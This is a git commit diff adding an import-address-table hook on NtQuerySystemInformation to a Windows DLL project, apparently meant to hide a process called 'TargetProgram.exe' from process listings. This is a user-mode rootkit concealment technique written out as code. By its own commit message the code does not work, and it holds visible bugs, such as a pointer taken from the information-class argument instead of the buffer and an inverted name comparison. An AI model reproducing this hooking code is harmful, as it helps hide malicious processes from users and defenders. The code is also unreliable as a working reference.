47708d7020a16a27d2e2769b56227011792d29f8
kooroshrz <knasa.kr@aut.ac.ir>
2019-12-29 14:46:15 +0330

    Hooked procedure compledted but does not works :)

--- HookerDll/src/Hooker.cpp
+++ HookerDll/src/Hooker.cpp
@@ -1,5 +1,8 @@
 #include "Hooker.h"
 
+PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)(
+	GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation")
+	);
 
 bool __stdcall DllMain(HINSTANCE hInstance,
 	DWORD dwReason,
@@ -22,9 +25,9 @@ void StartHook() {
 
 	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
 
-	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;
-	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
-	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER)&(pINH->OptionalHeader);
+	PIMAGE_DOS_HEADER		pIDH = (PIMAGE_DOS_HEADER)		pAddress;
+	PIMAGE_NT_HEADERS		pINH = (PIMAGE_NT_HEADERS)		(pAddress + pIDH->e_lfanew);
+	PIMAGE_OPTIONAL_HEADER	pIOH = (PIMAGE_OPTIONAL_HEADER)	&(pINH->OptionalHeader);
 
 
 	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress +
@@ -34,16 +37,64 @@ void StartHook() {
 		if(!strcmp((char*)(pAddress + pIID->Name), "ntdll.dll"))
 			break;
 
-	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
-	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
-	PIMAGE_IMPORT_BY_NAME pIIBN;
+	PIMAGE_THUNK_DATA		pITD			= (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
+	PIMAGE_THUNK_DATA		pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
+	PIMAGE_IMPORT_BY_NAME	pIIBN;
 
 	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
-		pIIBN = (_IMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
+		pIIBN = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
 		if (!strcmp("NtQuerySystemInformation", (char*)pIIBN->Name))
 			break;
 		pFirstThunkTest++;
 	}
 
+	DWORD dwOld = NULL;
+	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
+	pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInformation;
+	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);
+
+	CloseHandle(hModule);
+}
+
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+
+	__in		SYSTEM_INFORMATION_CLASS	SystemInformationClass,
+	__inout		PVOID						SystemInformation,
+	__in		ULONG						SystemInformationLength,
+	__out_opt	PULONG						ReturnLength
+
+) {
+
+	NTSTATUS status = OriginalNtQuerySystemInformation(
+		SystemInformationClass,
+		SystemInformation,
+		SystemInformationLength,
+		ReturnLength
+	);
+
+	if (SystemProcessInformation == SystemInformationClass && status == STATUS_SUCCESS) {
+
+
+		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
+		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformationClass;
+
+		do{
+
+			pCurrent = pNext;
+			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
+
+			if (wcsncmp(L"TargetProgram.exe", pNext->ImageName.Buffer, pNext->ImageName.Length)) {
+				if (!pNext->NextEntryOffset)
+					pCurrent->NextEntryOffset = 0;
+				else
+					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+			}
+
+		} while (pCurrent->NextEntryOffset != 0); 
+		
+
+	}
+
+	return status;
 
 }
--- HookerDll/src/Hooker.h
+++ HookerDll/src/Hooker.h
@@ -1,6 +1,7 @@
 #pragma once
 
 #define _CRT_SECURE_WARNINGS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
 #include <Windows.h>
 #include <TlHelp32.h>
@@ -9,3 +10,36 @@
 #include <Psapi.h>
 
 void StartHook();
+
+typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
+
+	ULONG				NextEntryOffset;
+	ULONG				NumberOfThreads;
+	LARGE_INTEGER		Reserved[3];
+	LARGE_INTEGER		CreateTime;
+	LARGE_INTEGER		UserTime;
+	LARGE_INTEGER		KernelTime;
+	UNICODE_STRING		ImageName;
+	ULONG				BasePriority;
+	HANDLE				ProcessId;
+	HANDLE				InheritedFromProcessId;
+
+} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
+
+typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION) (
+
+	__in		SYSTEM_INFORMATION_CLASS	SystemInformaionClass,
+	__inout		PVOID						SystemInformation,
+	__in		ULONG						SystemInformationLength,
+	__out_opt	PULONG						ReturnLength
+
+);
+
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+
+	__in		SYSTEM_INFORMATION_CLASS	SystemInformationClass,
+	__inout		PVOID						SystemInformation,
+	__in		ULONG						SystemInformationLength,
+	__out_opt	PULONG						ReturnLength
+
+);
